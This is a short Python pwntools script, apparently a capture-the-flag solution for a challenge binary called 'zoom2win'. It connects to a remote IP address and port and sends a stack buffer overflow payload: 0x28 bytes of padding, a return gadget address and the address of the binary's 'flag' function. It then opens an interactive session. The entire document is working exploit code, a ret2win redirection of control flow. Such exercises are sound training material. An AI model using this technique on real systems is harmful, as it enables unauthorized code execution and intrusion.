#!/usr/bin/python3

from pwn import *

p = remote("143.198.184.186", 5003)
e = ELF("./zoom2win")

padding = "A"*0x28

payload = padding.encode('utf-8')
payload += p64(0x004012b4)
payload += p64(e.sym['flag'])

p.sendlineafter("\n", payload)

p.interactive()
